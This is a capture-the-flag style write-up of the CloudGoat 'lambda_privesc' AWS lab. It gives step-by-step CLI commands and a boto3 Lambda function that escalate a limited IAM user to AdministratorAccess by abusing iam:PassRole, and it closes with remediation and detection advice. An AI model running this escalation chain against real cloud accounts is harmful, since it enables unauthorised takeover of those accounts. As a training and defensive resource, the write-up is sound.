CloudGoat — Write-up: lambda_privesc

Privilege Escalation via IAM PassRole + Lambda

Difficulty: Small / Easy · Platform: AWS

1. Executive summary

Starting from the IAM user Chris (highly limited permissions), it was possible to escalate all the way to AdministratorAccess by chaining three configuration weaknesses. The core vector is an unrestricted iam:PassRole permission, combined with full Lambda access and a trust policy that trusts the Lambda service.

The chain in one line

Chris → assumes lambdaManager → creates a Lambda function with the debug role (PassRole) → the Lambda runs as admin and grants itself AdministratorAccess.

2. Scenario actors
Resource	Role in the attack
User: Chris	Starting point. Limited permissions, but has sts:AssumeRole with Resource *.
Role: lambdaManager	Bridge. Has lambda:* + iam:PassRole. Chris can assume it.
Role: debug	Target. Admin permissions. Its trust policy ONLY trusts lambda.amazonaws.com.
Lambda function (created by the attacker)	Vehicle. Runs as debug and executes the admin action.
3. Enumeration (reconnaissance)

The step before any exploitation: understand what you have before acting. All commands run under the initial user's profile to avoid mixing with real credentials.

3.1 — Current identity
bash
aws sts get-caller-identity --profile cg-lambda

Confirms you're acting as Chris and returns the Account ID (needed to build the ARNs). The username comes from the end of the Arn field (whatever follows user/).

3.2 — User Chris's permissions
bash
aws iam list-attached-user-policies --user-name <chris> --profile cg-lambda
aws iam get-policy-version --policy-arn <arn> --version-id <vN> --profile cg-lambda

Key finding: Chris has sts:AssumeRole with Resource: "*" → can attempt to assume any role.

Tip: to find which policy version is active, check DefaultVersionId in the output of aws iam get-policy.

3.3 — Available roles and their permissions
bash
aws iam list-roles --profile cg-lambda
aws iam list-attached-role-policies --role-name <role> --profile cg-lambda
aws iam get-policy-version --policy-arn <arn> --version-id <vN> --profile cg-lambda

Key finding: the lambdaManager role has lambda:* and iam:PassRole.

3.4 — Trust policy of the target role (the decisive step)
bash
aws iam get-role --role-name <debug-role> --profile cg-lambda

Reading the AssumeRolePolicyDocument reveals that the Principal is Service: lambda.amazonaws.com. This means NOBODY can assume debug directly — only a Lambda function. This fact, which looks like an obstacle, is actually what points the way: to use debug you have to be Lambda.

4. Exploitation step by step
Step 1 — Assume the lambdaManager role
bash
aws sts assume-role \
  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<lambdaManager-role> \
  --role-session-name lm-session \
  --profile cg-lambda

Returns temporary credentials. Export them as environment variables (all three are required; without the SessionToken it won't work):

bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>

While these variables are exported, the CLI uses them over any profiles → the following commands run without --profile. Verify the switch with aws sts get-caller-identity.

Step 2 — Write the function code

File lambda_function.py. It runs as debug (admin), so it can call attach_user_policy, an admin action that neither Chris nor lambdaManager can perform on their own:

python
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='<chris>',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
Step 3 — Package into a ZIP
bash
zip function.zip lambda_function.py

Lambda is always deployed as a zip, even for a single file.

Step 4 — Create the function (the heart of the attack)
bash
aws lambda create-function \
  --function-name privesc-func \
  --runtime python3.12 \
  --role arn:aws:iam::<ACCOUNT_ID>:role/<debug-role> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --region us-east-1
--role: this is where iam:PassRole is used. The debug role is handed to the function as its execution role.
--handler: format <file-without-.py>.<function>.
fileb:// (with the b) is mandatory for binary files; file:// without the b fails.
Step 5 — Invoke the function

Wait until the state is Active (right after creation it shows as Pending):

bash
aws lambda get-function --function-name privesc-func \
  --region us-east-1 --query "Configuration.State"

aws lambda invoke --function-name privesc-func \
  --region us-east-1 response.json

cat response.json

A StatusCode 200 means the function ran, not that it did what was intended — you have to read response.json to confirm.

Step 6 — Verify the privilege escalation
bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
aws iam list-attached-user-policies --user-name <chris> --profile cg-lambda

AdministratorAccess should now appear in Chris's policies. It wasn't there before. Escalation confirmed.

5. Defensive lessons (blue team)

What was misconfigured and how to remediate it — the part that turns the lab into applicable knowledge:

Unrestricted iam:PassRole is the root flaw. Passing any role should never be allowed. Restrict it with a condition on the Resource (only the specific role ARNs the function legitimately needs).
sts:AssumeRole with Resource "*" is far too broad. It should be limited to the specific ARNs the principal actually needs to assume.
Wildcard permissions (lambda:*). Apply least privilege: only the Lambda actions the role actually uses.
Separation of privileges. A role that manages Lambda shouldn't also be able to pass administrator roles. The combination is what's dangerous, not each permission on its own.
Detection. CloudTrail should alert on suspicious sequences: AssumeRole followed by CreateFunction with a higher-privilege role, followed by AttachUserPolicy with AdministratorAccess.
6. Environment cleanup

CloudGoat only deletes what it created itself. The Lambda function was created manually → it must be deleted separately. CloudWatch logs survive the destroy.

bash
# 1. Delete the manually created function
aws lambda delete-function --function-name privesc-func \
  --region us-east-1 --profile cg-lambda

# 2. Delete the orphaned log group
aws logs delete-log-group \
  --log-group-name /aws/lambda/privesc-func \
  --region us-east-1 --profile cg-lambda

# 3. Destroy the scenario (reactivate the venv first: source venv/bin/activate)
cloudgoat destroy lambda_privesc
Post-cleanup verification
bash
aws lambda list-functions --region us-east-1 \
  --query "Functions[?contains(FunctionName,'privesc')]"
aws iam list-roles --query "Roles[?contains(RoleName,'cgid')].RoleName"
aws iam list-users --query "Users[?contains(UserName,'cgid')].UserName"

All three should return empty. The cgid identifier tags every CloudGoat resource; if anything with cgid is still alive, it was left behind.

7. Concepts to remember
PassRole: a function/service runs with the permissions of the role passed to it, not those of whoever created it. Passing a role more powerful than yourself = escalation.
Trust policy = second lock: to assume a role it's not enough to have AssumeRole; the target role must trust the principal. Always read the Principal of the trust policy.
Temporary credentials: an assumed role uses 3 values (including SessionToken). They go through environment variables, not aws configure.
Enumerate before attacking: the scenario's path was deduced by reading policies, not by guessing. The information was all there in the configurations.
